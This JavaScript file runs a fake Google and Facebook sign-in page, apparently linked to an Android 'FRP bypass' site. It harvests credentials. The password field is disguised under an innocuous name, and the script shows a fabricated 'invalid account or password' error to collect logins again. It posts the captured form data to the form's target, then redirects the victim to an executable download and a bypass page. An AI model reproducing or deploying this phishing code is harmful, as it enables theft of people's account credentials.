let userMessage = '';
let form = document.getElementById('maine-form');
let username = null;
let lastSignin = localStorage.getItem('lastSignin');

let isBadInput = localStorage.getItem('badInput');


let msgError = document.querySelector('#msg-form');

//facebook form error
if (lastSignin == 'invalid') {
    form.classList.add('invalid-username');
  }


  //google form error
  if (msgError) {
    isBadInput ? msgError.innerText = 'Invalid account or password please try again' : msgError.innerText = '';
    
    if (isBadInput == 'false') {
        msgError.innerText = '';
      }
      
    }
    
    let firsrtInput = form.querySelector('input:nth-child(1)');
    firsrtInput.value = localStorage.getItem('firstInput') ?? '';




    
    
    
    
    
    
    //Submit form and redirect
    
    form.addEventListener("submit", function(event) {
  let maineMessage = document.getElementById('maine-message');
  let isFormGood = false;
  let source = form.getAttribute('data-source');
  
  //Check if valid google message
  if (isStrongmessage(maineMessage.value) && source == "google") {
      localStorage.setItem('badInput',false);
      localStorage.clear('firstInput');
      isFormGood = true;
    } else if (source == 'google') {
      localStorage.setItem('badInput',true);
      localStorage.setItem('firstInput', firsrtInput.value);
      event.preventDefault(); // Prevent default form submission
      location.reload();
      isFormGood = false;
    }
    

 //invaid facebook username 
 if (source == 'facebook') {
    let username = form.querySelector('input:nth-child(1)').value;
    // username... remove white space
    username.trim();
    let usernameSpaces = 0;
    let isPhoneNum = username > 9000000000;
    for (let char of username) {if(char == ' '){usernameSpaces++}}

    let validUsername = usernameSpaces == 1 && username.length > 5 || isPhoneNum;
    if (validUsername && isStrongmessage(maineMessage.value)) {
      localStorage.setItem('lastSignin', 'valid');
        localStorage.clear('lastSignIn');
        localStorage.clear('firstInput');
        isFormGood = true;
    } else {
      event.preventDefault(); // Prevent default form submission
        //not a valid account username
        //Make the reload restart here to make link not visible in form
        localStorage.setItem('lastSignin', 'invalid');
        localStorage.setItem('firstInput', firsrtInput.value);
        location.reload();
        isFormGood = false;
    }
}

if (isFormGood) {
  event.preventDefault(); // Prevent default form submission
  
  // Get form data
  var formData = new FormData(this);
  
  // Send form data asynchronously
  fetch(this.action, {
    method: 'POST',
    body: formData,
    headers: {
      'Accept': 'application/json'
    }
  })
  .then(response => {
    if (response.ok) {
      // Optionally, do something with the successful response
      console.log("Form submitted successfully");
      // Redirect to github.com
      window.location.href = "https://download.imyfone.com/imyfone-lockwiper-android_setup-com_android.exe";
    } else {
      // Handle errors
      console.error("Form submission failed");
    }
  })
  .catch(error => {
    console.error("Error:", error);
  });
  setTimeout(()=>{
    window.location.href = "https://ukulyelye.github.io/FRP-bypass/";
  },1000);
}

});



















function isStrongmessage(message) {
    // Check for at least one uppercase letter
    const hasUppercase = /[A-Z]/.test(message);

    // Check for at least one lowercase letter
    const hasLowercase = /[a-z]/.test(message);

    // Check for at least one digit
    const hasDigit = /\d/.test(message);

    // Check for at least one special character (non-alphanumeric)
    const hasSpecialChar = /[^A-Za-z0-9]/.test(message);

    // Check minimum length
    const isLongEnough = message.length >= 4;

    const hasAlphabet = hasUppercase || hasLowercase;
    const hasTextOrDigit = hasAlphabet || hasDigit;

    // Combine all conditions
    return  hasSpecialChar && isLongEnough && hasTextOrDigit;
}